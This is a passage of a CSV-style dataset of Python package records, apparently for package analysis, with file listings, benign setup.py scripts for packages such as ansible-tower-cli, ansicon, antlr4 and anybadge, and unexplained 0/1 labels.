    ""ansible/plugins/action/hashivault_write_from_file"",
    ""ansible/plugins/doc_fragments/hashivault"",
]
files = [
    ""ansible/modules/hashivault"",
]

long_description = open('README.rst', 'r').read()

setup(
    name='ansible-modules-hashivault',
    version='4.7.0',
    description='Ansible Modules for Hashicorp Vault',
    long_description=long_description,
    long_description_content_type='text/x-rst',
    author='Terry Howe',
    author_email='terrylhowe@example.com',
    url='https://github.com/TerryHowe/ansible-modules-hashivault',
    py_modules=py_files,
    packages=files,
    install_requires=[
        'ansible>=4.0.0',
        'hvac>=0.11.2',
        'requests',
    ],
)
",1
ansible-runner-2.2.1,0,1,1,1,0,0,0,0,.cherry_picker.toml .coveragerc .dockerignore CODE_OF_CONDUCT.md issue_labeler.yml bug_report.yml config.yml documentation_report.yml feature_request.yml patchback.yml pr_labeler_existing.yml pr_labeler_new.yml ci.yml triage_existing.yml triage_new.yml .pre-commit-config.yaml .readthedocs.yaml .yamllint jobs.yaml .zuul.ignore pre.yaml project.yaml cleanup.py ansible_cfg.py command.py doc.py inventory.py runner.py _base.py __init__.py defaults.py awx_display.py __init__.py __init__.py exceptions.py interface.py loader.py output.py __init__.py runner.py runner_config.py streaming.py base64io.py capacity.py streaming.py __init__.py __init__.py __main__.py dependency_links.txt entry_points.txt not-zip-safe pbr.json PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS bindep.txt ChangeLog CODEOWNERS CONTRIBUTING.md envvars extravars passwords settings ssh_key hosts main.yml main.yml main.yml README.md main.yml inventory test.yml main.yml test.yml Dockerfile ansible_runner.config.rst ansible_runner.display_callback.rst ansible_runner.rst conf.py container.rst execution_environments.rst external_interface.rst index.rst install.rst intro.rst make.bat Makefile modules.rst python_interface.rst remote_jobs.rst requirements.in requirements.txt standalone.rst LICENSE.md Makefile MANIFEST.in changelog compat control copyright docker-compose.yml Dockerfile pydist-overrides rules format ansible-runner.spec.j2 docker-compose.yml Dockerfile.epel-7-x86_64 Dockerfile.epel-8-x86_64 PKG-INFO pytest.ini README.md requirements.txt SECURITY.md setup.cfg setup.py conftest.py envvars hosts use_role.yml envvars settings hosts test-container.yml envvars inv_1 inv_2 debug.yml main.yml settings main.yml test_ee.py envvars inventory gen_host_status.yml envvars settings hosts printenv.yml argument_specs. envvars hosts look_at_environment.py get_environment.yml envvars hosts sleep.yml envvars hosts .galaxy_inst main.yml main.yml use_role.yml other_callback.py conftest.py test_cleanup_images.py test_cli_containerized.py test_container_management.py Containerfile demo.yml inventory.ini test_config.py test_display_callback.py test_events.py test_interface.py test_main.py test_runner.py test_transmit_worker_process.py test___main__.py requirements.txt test_ansible_cfg.py test_command.py test_container_volmount_generation.py test_doc.py test_inventory.py test_runner.py test__base.py __init__.py conftest.py test_cleanup.py test_event_filter.py test_interface.py test_loader.py test_runner.py test_uuid.py __init__.py test_cleanup_folder.py test_dump_artifacts.py test_fifo_pipe.py test_utils.py __init__.py __init__.py test_worker.py __init__.py common.py __init__.py bindep.txt build-requirements.txt requirements-stable-2.10.txt requirements-stable-2.11.txt requirements-stable-2.12.txt requirements-stable-2.9.txt requirements.txt test-setup.sh upper-constraints-stable-2.10.txt upper-constraints-stable-2.11.txt upper-constraints-stable-2.12.txt upper-constraints-stable-2.9.txt tox.ini entrypoint.sh,"#!/usr/bin/env python

from setuptools import setup

setup(
    setup_requires=['pbr'],
    pbr=True,
)
",1
ansible-tower-cli-3.3.9,1,1,1,1,1,0,0,0,dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt Makefile README.md conf.rst exceptions.rst generate_tables.py index.rst ad_hoc.rst application.rst credential.rst credential_type.rst group.rst host.rst instance.rst instance_group.rst inventory.rst inventory_script.rst inventory_source.rst inventory_update.rst job.rst job_template.rst label.rst node.rst notification_template.rst organization.rst project.rst project_update.rst role.rst schedule.rst setting.rst team.rst user.rst workflow.rst workflow_job.rst schema_a.yml schema_b.yml schema_simple.yml schema_tiny.yml fake_data_creator.sh inventory_script_example.py README.rst teardown_script.sh variables.yml workflow_demo.sh index.rst CONFIG_CMD_OPTIONS.rst NOTIFICATION_TEMPLATE_MANAGEMENT.rst ROLE_MANAGEMENT.rst SURVEYS.rst VERSIONING.rst WORKFLOWS.rst conf.py CONTRIBUTING.rst HISTORY.rst index.rst install.rst quickstart.rst layout.html LICENSE MANIFEST.in PKG-INFO README.rst requirements.txt setup.cfg setup.py compat.py requirements.txt runtests.py test_api.py test_cli_action.py test_cli_misc.py test_cli_resource.py test_cli_transfer_common.py test_cli_transfer_logging_command.py test_cli_types.py test_conf.py test_exceptions.py test_models_base.py test_models_fields.py test_models_unified_jobs.py test_resources_ad_hoc.py test_resources_credential.py test_resources_group.py test_resources_host.py test_resources_inventory.py test_resources_inventory_source.py test_resources_job.py test_resources_job_template.py test_resources_label.py test_resources_notification_template.py test_resources_project.py test_resources_role.py test_resources_schedule.py test_resources_setting.py test_resources_workflow.py test_resources_workflow_job.py test_utils.py test_utils_datastructures.py test_utils_debug.py test_utils_parser.py test__init.py __init__.py api.py action.py base.py misc.py resource.py run.py cleaner.py common.py logging_command.py receive.py send.py __init__.py types.py __init__.py compat.py conf.py constants.py exceptions.py base.py fields.py __init__.py activity_stream.py ad_hoc.py application.py credential.py credential_type.py group.py host.py instance.py instance_group.py inventory.py inventory_script.py inventory_source.py inventory_update.py job.py job_event.py job_template.py label.py node.py notification_template.py organization.py project.py project_update.py role.py schedule.py setting.py team.py token.py unified_job.py user.py workflow.py workflow_job.py __init__.py data_structures.py debug.py exceptions.py grammar.py parser.py resource_decorators.py __init__.py __init__.py tox.ini,"#!/usr/bin/env python
# Copyright 2013-2015, Ansible, Inc.
# Michael DeHaan <michael@ansible.com>
# Luke Sneeringer <lsneeringer@ansible.com>
# and others
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import re
import os
import sys
import codecs
from distutils.core import setup
from setuptools import find_packages
from setuptools.command.test import test as TestCommand


pkg_name = 'tower_cli'
dashed_name = pkg_name.replace('_', '-')
awx_entry = dashed_name.replace('tower', 'awx')


# Avoid packaging any other API version of tower-cli with current one
# Note: The 0,1 in the format strings are for building el6 rpms with python 2.6.6
exclude_list = ['tests']
primary_install = len(pkg_name.split('_')) == 2
base_name = pkg_name[:9]
if not primary_install:
    exclude_list += [base_name, '{0}.*'.format(base_name)]
for v in (1, 2):
    if pkg_name.endswith(str(v)):
        continue
    v_name = '{0}_v{1}'.format(base_name, v)
    exclude_list += [v_name, '{0}.*'.format(v_name)]
discovered_packages = find_packages(exclude=exclude_list)


class Tox(TestCommand):
    """"""The test command should install and then run tox.

    Based on http://tox.readthedocs.org/en/latest/example/basic.html
    """"""
    user_options = [('tox-args=', 'a', ""Arguments to pass to tox"")]

    def initialize_options(self):
        TestCommand.initialize_options(self)
        self.tox_args = """"

    def finalize_options(self):
        TestCommand.finalize_options(self)
        self.test_args = []
        self.test_suite = True

    def run_tests(self):
        import tox  # Import here, because outside eggs aren't loaded.
        import shlex
        sys.exit(tox.cmdline(args=shlex.split(self.tox_args)))


def parse_requirements(filename):
    """"""Parse out a list of requirements from the given requirements
    requirements file.
    """"""
    reqs = []
    version_spec_in_play = None

    # Iterate over each line in the requirements file.
    for line in open(filename, 'r').read().strip().split('\n'):
        # Sanity check: Is this an empty line?
        # If so, do nothing.
        if not line.strip():
            continue

        # If this is just a plain requirement (not a comment), then
        # add it to the requirements list.
        if not line.startswith('#'):
            reqs.append(line)
            continue

        # ""Header"" comments take the form of ""=== Python {op} {version} ==="",
        # and make the requirement only matter for those versions.
        # If this line is a header comment, parse it.
        match = re.search(r'^# === [Pp]ython (?P<op>[<>=]{1,2}) '
                          r'(?P<major>[\d])\.(?P<minor>[\d]+) ===[\s]*$', line)
        if match:
            version_spec_in_play = match.groupdict()
            for key in ('major', 'minor'):
                version_spec_in_play[key] = int(version_spec_in_play[key])
            continue

        # If this is a comment that otherwise looks like a package, then it
        # should be a package applying only to the current version spec.
        #
        # We can identify something that looks like a package by a lack
        # of any spaces.
        if ' ' not in line[1:].strip() and version_spec_in_play:
            package = line[1:].strip()

            # Sanity check: Is our version of Python one of the ones currently
            # in play?
            op = version_spec_in_play['op']
            vspec = (version_spec_in_play['major'],
                     version_spec_in_play['minor'])
            if '=' in op and sys.version_info[0:2] == vspec:
                reqs.append(package)
            elif '>' in op and sys.version_info[0:2] > vspec:
                reqs.append(package)
            elif '<' in op and sys.version_info[0:2] < vspec:
                reqs.append(package)

    # Okay, we should have an entire list of requirements now.
    return reqs


def combine_files(*args):
    """"""returns a string of all the strings in *args combined together,
    with two line breaks between them""""""
    file_contents = []
    for filename in args:
        with codecs.open(filename, mode='r', encoding='utf8') as f:
            file_contents.append(f.read())
    return ""\n\n"".join(file_contents)


# Read the constants, for versioning information
constants = {}
exec(
    open(os.path.join(pkg_name, 'constants.py')).read(),
    constants
)


setup(
    # Basic metadata
    name='ansible-%s' % dashed_name,
    version=constants['VERSION'],
    author='Red Hat, Inc.',
    author_email='info@ansible.com',
    url='https://github.com/ansible/tower-cli',

    # Additional information
    description='A CLI tool for Ansible Tower and AWX.',
    long_description=combine_files(
        'README.rst',
        os.path.join('docs', 'source', 'HISTORY.rst')
    ),
    license='Apache 2.0',

    # How to do the install
    install_requires=parse_requirements('requirements.txt'),
    provides=[
        pkg_name,
    ],
    entry_points={
        'console_scripts': [
            '%s=%s.cli.run:cli' % (dashed_name, pkg_name),
            '%s=%s.cli.run:cli' % (awx_entry, pkg_name),
        ],
    },
    packages=discovered_packages,
    include_package_data=True,
    # How to do the tests
    tests_require=['tox'],
    cmdclass={'test': Tox},

    # PyPI metadata.
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Console',
        'Intended Audience :: Developers',
        'Intended Audience :: System Administrators',
        'License :: OSI Approved :: Apache Software License',
        'Operating System :: MacOS :: MacOS X',
        'Operating System :: POSIX :: Linux',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Topic :: System :: Software Distribution',
        'Topic :: System :: Systems Administration',
    ],
    zip_safe=False
)
",1
ansicolors-1.1.8,0,1,1,1,0,0,1,0,.coveragerc dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt CHANGES.yml colors.py csscolors.py version.py __init__.py LICENSE MANIFEST.in PKG-INFO pytest.ini README.rst setup.cfg setup.py show_colors.py test.py tox.ini toxcov.ini,,1
ansicon-1.89.0,0,1,1,1,1,0,0,0,ANSI32.dll ANSI64.dll __init__.py dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_ansicon.py test_ansicon.pyc __init__.py __init__.pyc test_ansicon.cpython-37.pyc __init__.cpython-37.pyc,"#!/usr/bin/env python
# Copyright 2017 Avram Lubkin, All Rights Reserved

# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.

""""""
A Python wrapper for loading Jason Hood's ANSICON

ANSICON can be found at https://github.com/adoxa/ansicon
""""""

import io

from setuptools import setup


def readme(filename, encoding='utf8'):
    """"""
    Read the contents of a file
    """"""

    with io.open(filename, encoding=encoding) as source:
        return source.read()


setup(
    name='ansicon',
    version='1.89.0',
    description=""Python wrapper for loading Jason Hood's ANSICON"",
    long_description=readme('README.rst'),
    author='Avram Lubkin',
    author_email='avylove@rockhopper.net',
    maintainer='Avram Lubkin',
    maintainer_email='avylove@rockhopper.net',
    url='https://github.com/Rockhopper-Technologies/ansicon',
    license='MPLv2.0',
    zip_safe=False,
    install_requires=[],
    tests_require=[],
    packages=['ansicon'],
    package_data={'ansicon': ['*.dll']},
    test_suite='tests',

    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Console',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)',
        'Operating System :: Microsoft :: Windows',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: Implementation :: CPython',
        'Programming Language :: Python :: Implementation :: PyPy',
        'Topic :: Utilities',
    ],
    keywords='ansicon terminal console',
)
",0
ansiwrap-0.8.4,0,1,1,1,1,0,1,0,.travis.yml ansistate.py core.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt AUTHORS CHANGES.yml demo.py LICENSE.txt MANIFEST.in PKG-INFO pytest.ini README README.rst setup.cfg setup.py test_ansiwrap.py tox.ini,,1
antchain_alipay_util-1.0.2,0,1,1,1,1,0,1,0,antchain_utils.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"'
 Licensed to the Apache Software Foundation (ASF) under one
 or more contributor license agreements.  See the NOTICE file
 distributed with this work for additional information
 regarding copyright ownership.  The ASF licenses this file
 to you under the Apache License, Version 2.0 (the
 ""License""); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at
     http://www.apache.org/licenses/LICENSE-2.0
 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
 ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 KIND, either express or implied.  See the License for the
 specific language governing permissions and limitations
 under the License.
'''

import os
from setuptools import setup, find_packages

""""""
Setup module for antchain_alipay_util.
Created on 06/09/2020
@author: Ant Chain SDK
""""""

PACKAGE = ""antchain_alipay_util""
DESCRIPTION = ""The antchain alipay util module of alibabaCloud Python SDK.""
AUTHOR = ""Ant Chain SDK""
AUTHOR_EMAIL = ""sdk-team@alibabacloud.com""
URL = ""https://github.com/alipay/antchain-openapi-util-sdk""
TOPDIR = os.path.dirname(__file__) or "".""
VERSION = __import__(PACKAGE).__version__

with open(""README.md"", encoding=""utf-8"") as fp:
    LONG_DESCRIPTION = fp.read()

setup_args = {
    'version': VERSION,
    'description': DESCRIPTION,
    'long_description': LONG_DESCRIPTION,
    'author': AUTHOR,
    'author_email': AUTHOR_EMAIL,
    'license': ""Apache License 2.0"",
    'url': URL,
    'keywords': ['antchain_alipay_util'],
    'packages': find_packages(exclude=[""tests*""]),
    'platforms': 'any',
    'install_requires': [],
    'classifiers': (
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Topic :: Software Development',
    )
}

setup(name='antchain_alipay_util', **setup_args)
",0
antlr4-python2-runtime-4.10.1,0,1,1,1,0,0,1,0,MANIFEST.in PKG-INFO README.txt RELEASE-4.5.txt setup.cfg setup.py ATN.py ATNConfig.py ATNConfigSet.py ATNDeserializationOptions.py ATNDeserializer.py ATNSimulator.py ATNState.py ATNType.py LexerAction.py LexerActionExecutor.py LexerATNSimulator.py ParserATNSimulator.py PredictionMode.py SemanticContext.py Transition.py __init__.py BufferedTokenStream.py CodePoints.py CommonTokenFactory.py CommonTokenStream.py DFA.py DFASerializer.py DFAState.py __init__.py DiagnosticErrorListener.py ErrorListener.py Errors.py ErrorStrategy.py __init__.py FileStream.py InputStream.py IntervalSet.py Lexer.py ListTokenSource.py LL1Analyzer.py Parser.py ParserInterpreter.py ParserRuleContext.py PredictionContext.py Recognizer.py RuleContext.py StdinStream.py Token.py TokenStreamRewriter.py Chunk.py ParseTreeMatch.py ParseTreePattern.py ParseTreePatternMatcher.py RuleTagToken.py TokenTagToken.py Tree.py Trees.py __init__.py Utils.py XPath.py XPathLexer.py __init__.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt,"from setuptools import setup

v = '4.10.1'
setup(
    name='antlr4-python2-runtime',
    version=v,
    url='http://www.antlr.org',
    license='BSD',
    packages=['antlr4', 'antlr4.atn', 'antlr4.dfa', 'antlr4.tree', 'antlr4.error', 'antlr4.xpath'],
    package_dir={'': 'src'},
    author='Eric Vergnaud, Terence Parr, Sam Harwell',
    author_email='eric.vergnaud@wanadoo.fr',
    description=f'ANTLR {v} runtime for Python 2.7.12'
)",0
antlr4-python3-runtime-4.10,0,1,1,1,0,0,1,0,MANIFEST.in PKG-INFO README.txt RELEASE-4.5.txt setup.cfg setup.py ATN.py ATNConfig.py ATNConfigSet.py ATNDeserializationOptions.py ATNDeserializer.py ATNSimulator.py ATNState.py ATNType.py LexerAction.py LexerActionExecutor.py LexerATNSimulator.py ParserATNSimulator.py PredictionMode.py SemanticContext.py Transition.py __init__.py BufferedTokenStream.py CommonTokenFactory.py CommonTokenStream.py DFA.py DFASerializer.py DFAState.py __init__.py DiagnosticErrorListener.py ErrorListener.py Errors.py ErrorStrategy.py __init__.py FileStream.py InputStream.py IntervalSet.py Lexer.py ListTokenSource.py LL1Analyzer.py Parser.py ParserInterpreter.py ParserRuleContext.py PredictionContext.py Recognizer.py RuleContext.py StdinStream.py Token.py TokenStreamRewriter.py Chunk.py ParseTreeMatch.py ParseTreePattern.py ParseTreePatternMatcher.py RuleTagToken.py TokenTagToken.py Tree.py Trees.py __init__.py Utils.py XPath.py XPathLexer.py __init__.py _pygrun.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"from setuptools import setup

v = '4.10'

setup(
    name='antlr4-python3-runtime',
    version=v,
    packages=['antlr4', 'antlr4.atn', 'antlr4.dfa', 'antlr4.tree', 'antlr4.error', 'antlr4.xpath'],
    package_dir={'': 'src'},
    install_requires=[
        ""typing ; python_version<'3.5'"",
    ],
    url='http://www.antlr.org',
    license='BSD',
    author='Eric Vergnaud, Terence Parr, Sam Harwell',
    author_email='eric.vergnaud@wanadoo.fr',
    entry_points={'console_scripts': ['pygrun=antlr4._pygrun:main']},
    description=f'ANTLR {v} runtime for Python 2.7.12'
)
",1
anyascii-0.3.1,0,1,1,1,1,0,1,0,000 001 002 003 004 005 006 007 008 009 00a 00b 00c 00d 00e 00f 010 011 012 013 014 015 016 017 018 019 01a 01b 01c 01d 01e 01f 020 021 022 023 024 025 026 027 028 029 02a 02b 02c 02d 02e 02f 030 031 032 033 034 035 036 037 038 039 03a 03b 03c 03d 03e 03f 040 041 042 043 044 045 046 047 048 049 04a 04b 04c 04d 04e 04f 050 051 052 053 054 055 056 057 058 059 05a 05b 05c 05d 05e 05f 060 061 062 063 064 065 066 067 068 069 06a 06b 06c 06d 06e 06f 070 071 072 073 074 075 076 077 078 079 07a 07b 07c 07d 07e 07f 080 081 082 083 084 085 086 087 088 089 08a 08b 08c 08d 08e 08f 090 091 092 093 094 095 096 097 098 099 09a 09b 09c 09d 09e 09f 0a0 0a1 0a2 0a3 0a4 0a5 0a6 0a7 0a8 0a9 0aa 0ab 0ac 0ad 0ae 0af 0b0 0b1 0b2 0b3 0b4 0b5 0b6 0b7 0b8 0b9 0ba 0bb 0bc 0bd 0be 0bf 0c0 0c1 0c2 0c3 0c4 0c5 0c6 0c7 0c8 0c9 0ca 0cb 0cc 0cd 0ce 0cf 0d0 0d1 0d2 0d3 0d4 0d5 0d6 0d7 0f9 0fa 0fb 0fc 0fd 0fe 0ff 100 101 102 103 104 105 106 107 108 109 10a 10b 10c 10d 10e 10f 110 111 112 113 114 115 116 117 118 119 11a 11c 11d 11e 11f 124 12f 130 131 132 133 134 144 145 146 16a 16b 16e 16f 170 171 172 173 174 175 176 177 178 179 17a 17b 17c 17d 17e 17f 180 181 182 183 184 185 186 187 188 189 18a 18b 18c 18d 1b0 1b1 1b2 1bc 1cf 1d0 1d1 1d2 1d3 1d4 1d5 1d6 1d7 1df 1e0 1e1 1e2 1e7 1e8 1e9 1ec 1ed 1ee 1f0 1f1 1f2 1f3 1f4 1f5 1f6 1f7 1f8 1f9 1fa 1fb 200 201 202 203 204 205 206 207 208 209 20a 20b 20c 20d 20e 20f 210 211 212 213 214 215 216 217 218 219 21a 21b 21c 21d 21e 21f 220 221 222 223 224 225 226 227 228 229 22a 22b 22c 22d 22e 22f 230 231 232 233 234 235 236 237 238 239 23a 23b 23c 23d 23e 23f 240 241 242 243 244 245 246 247 248 249 24a 24b 24c 24d 24e 24f 250 251 252 253 254 255 256 257 258 259 25a 25b 25c 25d 25e 25f 260 261 262 263 264 265 266 267 268 269 26a 26b 26c 26d 26e 26f 270 271 272 273 274 275 276 277 278 279 27a 27b 27c 27d 27e 27f 280 281 282 283 284 285 286 287 288 289 28a 28b 28c 28d 28e 28f 290 291 292 293 294 295 296 297 298 299 29a 29b 29c 29d 29e 29f 2a0 2a1 2a2 2a3 2a4 2a5 2a6 2a7 2a8 2a9 2aa 2ab 2ac 2ad 2ae 2af 2b0 2b1 2b2 2b3 2b4 2b5 2b6 2b7 2b8 2b9 2ba 2bb 2bc 2bd 2be 2bf 2c0 2c1 2c2 2c3 2c4 2c5 2c6 2c7 2c8 2c9 2ca 2cb 2cc 2cd 2ce 2cf 2d0 2d1 2d2 2d3 2d5 2d6 2d7 2d8 2d9 2da 2db 2dc 2dd 2de 2e0 2e1 2e2 2e3 2e4 2e5 2e6 2e7 2e8 2e9 2ea 2eb 2f8 2f9 2fa 300 301 302 303 304 305 306 307 308 309 30a 30b 30c 30d 30e 30f 310 311 312 313 e00 __init__.py __init__.py LICENSE PKG-INFO pyproject.toml README.md setup.py test_anyascii.py,"#!/usr/bin/env python
# setup.py generated by flit for tools that don't yet use PEP 517

from distutils.core import setup

packages = \
['anyascii', 'anyascii._data']

package_data = \
{'': ['*']}

setup(name='anyascii',
      version='0.3.1',
      description='Unicode to ASCII transliteration',
      author='Hunter WB',
      author_email='hunter@hunterwb.com',
      url='https://github.com/anyascii/anyascii',
      packages=packages,
      package_data=package_data,
      python_requires='>=3.3',
     )
",1
anybadge-1.12.0,0,1,1,1,1,0,1,0,badge.py cli.py colors.py config.py exceptions.py helpers.py cli.py config.py request_handler.py __init__.py styles.py default.svg gitlab_scoped.svg __init__.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt anybadge_server.py AUTHORS.rst LICENSE PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/python
import os
import re
from setuptools import setup

with open(""README.md"", encoding=""utf-8"") as f:
    long_description = f.read()

# Attempt to get version number from TravisCI environment variable
version = os.environ.get(""TRAVIS_TAG"", default=""0.0.0"")

# Remove leading 'v'
version = re.sub(""^v"", """", version)

setup(
    name=""anybadge"",
    description=""Simple, flexible badge generator for project badges."",
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    version=version,
    author=""Jon Grace-Cox"",
    author_email=""jongracecox@gmail.com"",
    packages=[""anybadge"", ""anybadge.templates"", ""anybadge.server""],
    py_modules=[""anybadge_server""],
    setup_requires=[""setuptools"", ""wheel""],
    tests_require=[],
    install_requires=[""packaging""],
    package_data={""anybadge"": [""templates/*.svg""]},
    options={""bdist_wheel"": {""universal"": False}},
    python_requires="">=3.7"",
    url=""https://github.com/jongracecox/anybadge"",
    entry_points={
        ""console_scripts"": [
            ""anybadge=anybadge.cli:main"",
            ""anybadge-server=anybadge.server.cli:main"",
        ],
    },
    classifiers=[""License :: OSI Approved :: MIT License""],
)
",0
anyconfig-0.13.0,0,1,1,1,1,0,0,0,bug_report.md feature_request.md tests-in-centos.yml tests.yml .gitignore AUTHORS.txt anyconfig_cli.1 anyconfig.api.datatypes.rst anyconfig.api.rst anyconfig.api.utils.rst anyconfig.api._dump.rst anyconfig.api._load.rst anyconfig.api._open.rst anyconfig.backend.base.compat.rst anyconfig.backend.base.datatypes.rst anyconfig.backend.base.dumpers.rst anyconfig.backend.base.loaders.rst anyconfig.backend.base.parsers.rst anyconfig.backend.base.rst anyconfig.backend.base.utils.rst anyconfig.backend.ini.rst anyconfig.backend.json.common.rst anyconfig.backend.json.default.rst anyconfig.backend.json.rst anyconfig.backend.json.simplejson.rst anyconfig.backend.pickle.rst anyconfig.backend.properties.rst anyconfig.backend.rst anyconfig.backend.shellvars.rst anyconfig.backend.toml.rst anyconfig.backend.xml.rst anyconfig.backend.yaml.common.rst anyconfig.backend.yaml.pyyaml.rst anyconfig.backend.yaml.rst anyconfig.backend.yaml.ruamel_yaml.rst anyconfig.cli.rst anyconfig.common.datatypes.rst anyconfig.common.errors.rst anyconfig.common.rst anyconfig.dicts.rst anyconfig.ioinfo.constants.rst anyconfig.ioinfo.datatypes.rst anyconfig.ioinfo.detectors.rst anyconfig.ioinfo.factory.rst anyconfig.ioinfo.rst anyconfig.ioinfo.utils.rst anyconfig.models.processor.rst anyconfig.models.rst anyconfig.parser.rst anyconfig.parsers.parsers.rst anyconfig.parsers.rst anyconfig.parsers.utils.rst anyconfig.processors.datatypes.rst anyconfig.processors.processors.rst anyconfig.processors.rst anyconfig.processors.utils.rst anyconfig.query.datatypes.rst anyconfig.query.default.rst anyconfig.query.query.rst anyconfig.query.rst anyconfig.schema.datatypes.rst anyconfig.schema.default.rst anyconfig.schema.jsonschema.rst anyconfig.schema.rst anyconfig.template.jinja2.rst anyconfig.template.rst anyconfig.utils.detectors.rst anyconfig.utils.files.rst anyconfig.utils.lists.rst anyconfig.utils.rst anyconfig.utils.utils.rst index.rst cli.rst conf.py design.rst hacking.rst index.rst introduction.rst Makefile requirements.txt usage.rst LICENSE.MIT MANIFEST.in mypy.ini NEWS copr-build.sh gen-authors.sh gen-readme.sh header.rst nose.cfg package.spec.in scrutinizer.yml PKG-INFO README.rst requirements.txt requirements_min.txt setup.cfg setup.py datatypes.py utils.py _dump.py _load.py _open.py __init__.py compat.py datatypes.py dumpers.py loaders.py parsers.py utils.py __init__.py ini.py common.py default.py simplejson.py __init__.py pickle.py properties.py shellvars.py toml.py xml.py common.py pyyaml.py ruamel_yaml.py __init__.py __init__.py actions.py constants.py detectors.py filters.py io.py parse_args.py utils.py _main.py __init__.py datatypes.py errors.py __init__.py dicts.py constants.py datatypes.py detectors.py factory.py utils.py __init__.py processor.py __init__.py parser.py parsers.py utils.py __init__.py datatypes.py processors.py utils.py __init__.py py.typed datatypes.py default.py query.py __init__.py datatypes.py default.py jsonschema.py __init__.py singleton.py jinja2.py __init__.py detectors.py files.py lists.py utils.py __init__.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt common.py test_basics.py __init__.py common.py test_basics.py __init__.py common.py test_basics.py test_multi_types.py test_query.py test_schema.py test_templates.py __init__.py common.py test_basics.py test_query.py test_schema.py test_template.py __init__.py collector.py common.py datatypes.py test_basics.py test_collector.py test_common.py test_multi_types.py test_query.py test_schema.py test_template.py test_utils.py utils.py __init__.py common.py test_basics.py __init__.py common.py test_ac_parser.py test_basics.py test_common.py test_multi_types.py test_optional_types.py test_primitives.py test_query.py test_schema.py test_template.py __init__.py test_utils.py __init__.py test_dumpers.py test_loaders.py test_parsers.py test_utils.py __init__.py common.py constants.py test_default.py test_simplejson.py __init__.py test_ini.py test_pickle.py test_properties.py test_shellvars.py test_toml.py test_xml.py common.py test_pyyaml.py test_ruamel_yaml.py __init__.py __init__.py collector.py constants.py datatypes.py test_collector.py test_utils.py utils.py __init__.py collectors.py datatypes.py test_base.py test_detectors.py test_errors.py test_extra_options.py test_ignore_missing.py test_multi_inputs.py test_parse_args.py test_query.py test_schema.py test_show.py test_single_input.py test_single_input_to_yaml_output.py test_template.py __init__.py common.py common.py test_functions.py test_get.py test_merge.py test_mk_nested_dic.py __init__.py constants.py test_detectors.py test_factory.py test_utils.py __init__.py common.py test_attrlist.py test_attrlist_0.py test_list.py test_parse.py test_single.py __init__.py test_parsers.py test_utils.py __init__.py pip_install.bats common.py test_processors.py test_utils.py __init__.py test_query.py __init__.py requirements.txt requirements_plugins.txt requirements_type-check.txt 00-00-cnf.json 00-00-cnf_indented.json 00-01-cnf.json 00-02-cnf.json 00-cnf.json 00-cnf.yml 00-scm.json 00-template-ctx.yml 20-00-cnf.ini 20-00-cnf.json 20-00-cnf.properties 20-00-cnf.sh 20-00-cnf.toml 20-00-cnf.xml 20-00-cnf.yml 20-10-cnf.xml 30-00-cnf.json 30-00-template-cnf-ng-scm.json 30-00-template-cnf.json 30-10-template-cnf.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.py 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 10.json 10.json 10.json 10.json 20.json 30.json 40.json 50.json 10.json 20.json 30.json 40.json 50.json 10.json 20.json 30.json 40.json 50.json README.md 10.json 10.json 10.json 10.json 10.json README.md 10.json 10.json 10.json 10.json 10.json README.md 10.json 20.json 30.json 10.json 10.json 10.json 10.json 10.json README.md 10.json 20.xml 30.sh 10.json 10.json 10.json 10.json 10.json README.md 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 20.json 10.json 20.json 10.json 20.json 10.json 10.json 10.json README.md 10.json 20.json 30.json 40.json 10.json 20.json 30.json 40.json 10.json 20.json 30.json 40.json README.md 10.json 20.json 10.json 20.json 10.json 20.json README.md 10.json 10.json 10.json README.md 